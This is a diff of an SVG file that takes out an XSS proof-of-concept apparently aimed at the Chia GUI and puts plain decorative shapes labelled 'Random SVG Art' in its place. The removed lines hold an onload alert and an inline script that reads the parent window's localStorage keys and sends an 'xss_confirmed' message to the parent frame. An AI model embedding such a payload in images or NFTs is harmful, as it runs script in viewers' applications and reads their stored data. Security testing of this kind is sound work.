@@ -1,29 +1,35 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!-- XSS PoC SVG for Chia GUI: well-formed, no unescaped < or > in attributes -->
 <svg xmlns="http://www.w3.org/2000/svg"
-     width="100" height="100"
-     onload="alert('Chia GUI XSS PoC – SVG loaded');">
+     width="200" height="200" viewBox="0 0 200 200">
 
-  <!-- Visible content -->
-  <rect width="100" height="100" fill="red"/>
-  <text x="10" y="55" fill="white" font-size="12">PWNED</text>
+  <!-- Background gradient -->
+  <defs>
+    <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%"  stop-color="#7FDBFF"/>
+      <stop offset="100%" stop-color="#0074D9"/>
+    </linearGradient>
+  </defs>
+  <rect x="0" y="0" width="200" height="200" fill="url(#grad)" />
 
-  <!-- Inline payload -->
-  <script type="application/ecmascript"><![CDATA[
-    alert('Chia GUI XSS PoC – inline script running');
+  <!-- Random circles -->
+  <circle cx="60"  cy="60"  r="35" fill="#FF4136" opacity="0.85"/>
+  <circle cx="150" cy="45"  r="28" fill="#2ECC40" opacity="0.75"/>
+  <circle cx="100" cy="140" r="40" fill="#FFDC00" opacity="0.65"/>
 
-    /* Enumerate localStorage keys from parent (if same-origin) */
-    try {
-      console.log('window.top.localStorage keys →',
-                  Object.keys(window.top.localStorage || {}));
-    } catch (e) {
-      console.log('Cannot read window.top.localStorage:', e);
-    }
+  <!-- Random rectangles -->
+  <rect x="15"  y="130" width="50" height="25" fill="#B10DC9" opacity="0.8" rx="5" ry="5"/>
+  <rect x="125" y="100" width="60" height="30" fill="#39CCCC" opacity="0.8" rx="5" ry="5"/>
+  <rect x="70"  y="20"  width="40" height="15" fill="#F012BE" opacity="0.9" rx="4" ry="4"/>
 
-    /* Signal success to parent frame */
-    window.top.postMessage(
-      { source: 'chia_nft_svg', type: 'xss_confirmed' },
-      '*'
-    );
-  ]]></script>
+  <!-- Random line pattern -->
+  <g stroke="#FFFFFF" stroke-width="2" stroke-opacity="0.6">
+    <line x1="0" y1="0"   x2="200" y2="200"/>
+    <line x1="200" y1="0" x2="0"   y2="200"/>
+  </g>
+
+  <!-- Simple text label -->
+  <text x="100" y="190" font-family="monospace" font-size="12"
+        text-anchor="middle" fill="#FFFFFF" opacity="0.8">
+    Random SVG Art
+  </text>
 </svg>
